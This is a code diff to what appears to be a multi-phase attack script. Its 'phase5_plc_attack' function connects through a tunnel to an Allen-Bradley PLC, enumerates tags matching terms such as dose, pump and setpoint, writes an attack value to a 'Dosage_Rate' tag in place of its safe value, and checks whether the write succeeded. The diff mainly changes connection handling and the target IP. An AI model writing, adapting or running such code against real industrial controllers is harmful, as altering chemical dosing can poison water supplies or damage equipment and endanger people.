@@ -70,7 +70,7 @@ CFG = {
         "port":     22,
     },
     "plc": {
-        "ip":           "10.20.20.100",
+        "ip":           "10.20.20.111",
         "type":         "Allen-Bradley / Rockwell (EtherNet/IP)",
         "tag":          "Dosage_Rate",
         "safe_value":   8,
@@ -1135,8 +1135,11 @@ def phase5_plc_attack() -> PhaseResult:
         INTERESTING = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz"}
         NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
 
-        with LogixDriver("127.0.0.1") as plc_conn:
+        plc_conn = LogixDriver("127.0.0.1")
+        plc_conn.open()
+        ok(f"Connected to PLC via tunnel  127.0.0.1 → {plc_ip}")
 
+        try:
             # ── Tag enumeration ───────────────────────────────────────────────
             info("Enumerating PLC tag list...")
             all_tags = plc_conn.get_tag_list()
@@ -1158,12 +1161,12 @@ def phase5_plc_attack() -> PhaseResult:
             console.print(tag_table)
 
             if not filtered:
-                warn("No interesting tags matched the filter — all tags:")
+                warn("No interesting tags matched the filter — showing all tags:")
                 all_table = Table(show_header=True, header_style="bold cyan",
                                   border_style="dim")
                 all_table.add_column("Tag Name",  style="dim green",  width=36)
                 all_table.add_column("Data Type", style="dim yellow", width=12)
-                for t in all_tags[:40]:   # cap at 40 to avoid wall of text
+                for t in all_tags[:40]:
                     all_table.add_row(t.tag_name, str(t.data_type))
                 console.print(all_table)
 
@@ -1186,6 +1189,9 @@ def phase5_plc_attack() -> PhaseResult:
 
             after = plc_conn.read(tag)
             info(f"After : {tag} = {after.value}")
+
+        finally:
+            plc_conn.close()
 
         if after.value == atk_val:
             r.status  = "success"
